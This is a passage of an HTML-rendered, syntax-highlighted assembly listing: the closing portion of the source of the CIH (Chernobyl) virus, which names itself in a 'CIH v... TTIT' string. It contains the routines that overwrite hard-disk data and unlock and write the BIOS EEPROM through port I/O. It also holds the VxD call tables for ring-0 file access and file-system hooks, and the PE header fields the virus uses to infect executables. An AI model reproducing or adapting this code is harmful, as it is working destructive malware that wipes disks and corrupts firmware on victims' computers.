            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4dh</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoopOfKillHardDisk</span><span class="sc0">
 
</span><span class="sc5">KillNextDataSection</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FirstKillHardDiskNumber</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoopOfKillHardDisk</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Enable EEPROM to Write  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">EnableEEPROMToWrite</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 
            </span><span class="sc6">ret</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * IO for EEPROM           *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">IOForEEPROM</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@10</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">IOForEEPROM</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
 
</span><span class="sc5">BooleanCalculateCode</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 
            </span><span class="sc6">ret</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *         Static Data                       *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">LastVxDCallAddress</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
</span><span class="sc5">VxDCallAddressTable</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">IFSMgr_RemoveFileSystemApiHook</span><span class="sc4">-</span><span class="sc5">_PageAllocate</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">UniToBCSPath</span><span class="sc4">-</span><span class="sc5">IFSMgr_RemoveFileSystemApiHook</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc4">-</span><span class="sc5">UniToBCSPath</span><span class="sc0">
 
</span><span class="sc5">VxDCallIDTable</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00010053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400032h</span><span class="sc0">
</span><span class="sc5">VxDCallTableSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">VxDCallIDTable</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *                Virus Version Copyright                *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">VirusVersionCopyright</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CIH v'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MajorVirusVersion</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'.'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MinorVirusVersion</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' TTIT'</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *         Virus Size                        *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">VirusSize</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc1">;               + SizeOfVirusCodeSectionTableEndMark(04h)</span><span class="sc0">
</span><span class="sc1">;               + NumberOfSections(??)*SizeOfVirusCodeSectionTable(08h)</span><span class="sc0">
</span><span class="sc1">;               + SizeOfTheFirstVirusCodeSectionTable(04h)</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *         Dynamic Data                      *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">VirusGameDataStartAddress</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">VirusSize</span><span class="sc0">
</span><span class="sc5">@6</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">VirusGameDataStartAddress</span><span class="sc0">
</span><span class="sc5">OnBusy</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileModificationTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
 
</span><span class="sc5">FileNameBuffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">FileNameBufferSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@7</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">FileNameBuffer</span><span class="sc0">
 
</span><span class="sc5">DataBuffer</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">@8</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">DataBuffer</span><span class="sc0">
</span><span class="sc5">NumberOfSections</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">TimeDateStamp</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SymbolsPointer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NumberOfSymbols</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfOptionalHeader</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_Characteristics</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Magic</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LinkerVersion</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfCode</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfInitializedData</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfUninitializedData</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">BaseOfCode</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">BaseOfData</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ImageBase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@9</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">SectionAlignment</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileAlignment</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ImageVersion</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SubsystemVersion</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfImage</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfHeaders</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfImageHeaderToRead</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">NumberOfSections</span><span class="sc0">
 
</span><span class="sc5">NewAddressOfEntryPoint</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">DataBuffer</span><span class="sc0">  </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">SizeOfImageHeaderToWrite</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">04h</span><span class="sc0">
 
</span><span class="sc5">StartOfSectionTable</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">@9</span><span class="sc0">
</span><span class="sc5">SectionName</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc0"> </span><span class="sc1">; QWORD</span><span class="sc0">
</span><span class="sc5">VirtualSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">VirtualAddress</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc0"> </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">SizeOfRawData</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">PointerToRawData</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">PointerToRelocations</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">PointerToLineNumbers</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc0"> </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">NumberOfRelocations</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; WORD</span><span class="sc0">
</span><span class="sc5">NumberOfLinenNmbers</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc0"> </span><span class="sc1">; WORD</span><span class="sc0">
</span><span class="sc5">Characteristics</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc0"> </span><span class="sc1">; DWORD</span><span class="sc0">
</span><span class="sc5">SizeOfScetionTable</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">Characteristics</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">SectionName</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *     Virus Total Need Memory                   *</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">VirusNeedBaseMemory</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
 
</span><span class="sc5">VirusTotalNeedMemory</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">@9</span><span class="sc0">
</span><span class="sc1">;               + NumberOfSections(??)*SizeOfScetionTable(28h)</span><span class="sc0">
</span><span class="sc1">;               + SizeOfVirusCodeSectionTableEndMark(04h)</span><span class="sc0">
</span><span class="sc1">;               + NumberOfSections(??)*SizeOfVirusCodeSectionTable(08h)</span><span class="sc0">
</span><span class="sc1">;               + SizeOfTheFirstVirusCodeSectionTable(04h)</span><span class="sc0">
 
</span><span class="sc1">; *********************************************************</span><span class="sc0">
</span><span class="sc1">; *********************************************************</span><span class="sc0">
 
</span><span class="sc5">VirusGame</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">
 
                        </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">FileHeader</span></div></body>
</html>
